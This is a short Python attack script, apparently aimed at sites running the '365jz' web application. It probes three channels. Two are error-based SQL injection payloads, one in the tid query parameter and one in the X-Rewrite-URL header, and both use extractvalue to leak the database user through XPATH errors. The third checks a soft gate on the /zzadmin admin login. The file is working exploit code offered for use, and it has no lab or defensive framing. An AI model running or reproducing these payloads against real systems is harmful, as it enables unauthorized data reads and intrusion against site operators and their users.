#!/usr/bin/env python3
"""365jz quick channel probe.

Usage: python3 365jz_probe.py <host> [ip]

Verifies which attack channels are live on a 365jz target:
  1) tid numeric injection (extractvalue XPATH read)
  2) X-Rewrite-URL header injection (requires isdirwz=Y + leading '/')
  3) /zzadmin/login.php soft-gate state
"""
import re
import sys
import urllib.request

UA = {"User-Agent": "Mozilla/5.0"}


def fetch(url, headers=None, timeout=20):
    req = urllib.request.Request(url, headers=headers or {})
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except Exception as e:
        body = e.read().decode("utf-8", "ignore") if hasattr(e, "read") else str(e)
        return getattr(e, "code", 0), body


def xpath_of(body):
    m = re.search(r"XPATH syntax error: '([^']*)'", body)
    return m.group(1) if m else None


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return
    host = sys.argv[1]
    ip = sys.argv[2] if len(sys.argv) > 2 else host
    base = "http://%s" % ip
    h = {"Host": host, "Cookie": "365aixue=365aixue.com"}
    h.update(UA)

    # 1) tid channel
    p = "/index.php?act=list&tid=1%20and%20extractvalue(1,concat(0x7e,user()))"
    c, b = fetch(base + p, h)
    print("[tid]      %s len=%d xpath=%s" % (c, len(b), xpath_of(b)))

    # 2) X-Rewrite-URL channel
    h2 = dict(h)
    h2["X-Rewrite-URL"] = "/x')and(extractvalue(1,concat(0x7e,user())))and('1'='1/"
    c, b = fetch(base + "/index.php?act=list&isdirwz=Y", h2)
    print("[xrewrite] %s len=%d xpath=%s" % (c, len(b), xpath_of(b)))

    # 3) login gate
    c, b = fetch(base + "/zzadmin/login.php", {"Host": host, **UA})
    gate = "为了后台安全" in b
    print("[login]    %s len=%d blocked_by_soft_gate=%s" % (c, len(b), gate))


if __name__ == "__main__":
    main()
